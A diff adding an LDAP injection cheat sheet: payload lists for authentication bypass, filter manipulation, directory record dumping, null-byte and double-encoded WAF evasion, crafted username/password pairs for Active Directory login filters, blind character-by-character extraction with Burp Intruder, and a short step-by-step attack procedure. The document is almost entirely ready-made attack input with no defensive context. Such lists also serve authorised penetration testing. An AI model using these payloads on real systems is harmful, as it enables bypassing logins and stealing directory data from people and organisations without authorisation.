@@ -1,0 +1,101 @@
+# LDAP Injection Payloads
+
+## AUTH BYPASS (filter injection)
+```
+*)(&
+*)(uid=*
+*)(uid=*))(|(uid=*
+admin)(|(password=*
+admin)(|(password=*)
+*))
+*)(|(password=*
+)(&(uid=
+)(uid=*
+)(|(uid=
+admin)(uid=*
+admin*)((|(password=*
+admin))(|(password=*
+admin))(|(password=
+```
+
+## BOOLEAN / FILTER MANIPULATION
+```
+*)(cn=*
+*)(|(cn=*
+*)(&(cn=*
+)(cn=*
+)(objectClass=*)
+(|(cn=*
+(&(cn=*
+(&(objectClass=*)
+(|(objectClass=*
+*)(&(objectClass=user)(uid=*
+```
+
+## INFORMATION DISCLOSURE (dump records)
+```
+uid=*
+uid=*)(uid=*
+uid=*))(|(uid=*
+mail=*
+sn=*
+cn=*
+ou=*
+```
+```
+*)(name=*
+*)(employeeNumber=*
+*)(department=*
+```
+
+## NULL BYTE / WAF BYPASS
+```
+%00*)(uid=*
+%00)(&
+%2A%29%28%26=1        URL-encoded
+%252A%2529%2528%2526=1   double-encoded
+admin%00
+admin%00%26%28%26
+```
+
+## Specifically for common formulas
+Auth filter: `(&(sAMAccountName=USER)(userPassword=PASS))`
+```
+USER: *)(sAMAccountName=*
+PASS: *
+```
+```
+USER: admin)(|(sAMAccountName=*
+PASS: whatever)))
+```
+```
+USER: *)(&(sAMAccountName=admin)(userPassword=
+PASS: *))(&
+```
+Search filter: `(uid=INPUT)`
+```
+INPUT: *)(uid=*
+INPUT: *)(objectClass=*
+INPUT: admin)(uid=*
+INPUT: admin))(|(uid=*
+```
+
+## Blind data extraction (bit-by-bit, like SQLi)
+Use Burp Intruder on `*)(companyName=X*` char-by-char similar to SQLi regex oracle:
+```
+*)(mail=admin@x*
+*)((mail=admin@x*)  variant
+```
+Pattern: `*)(cn = A*` then `AB*` then `ABC*`... every correct char returns records.
+
+## Encoded variants
+| Encoded | Decoded |
+|---------|---------|
+| `%28%26%28uid%3D*` | `(&(uid=*` |
+| `%29%28%7C%28uid%3D*` | `)(|(uid=*` |
+| `%2A%29%28uid%3D*` | `*)(uid=*` |
+
+## Fastest test requests
+1. Login with `*` both fields.
+2. If no bypass, intercept and fuzz `user` with the auth-bypass list above.
+3. If filter returns error `Bad search filter` vs no error → filter is injectable (keep refining).
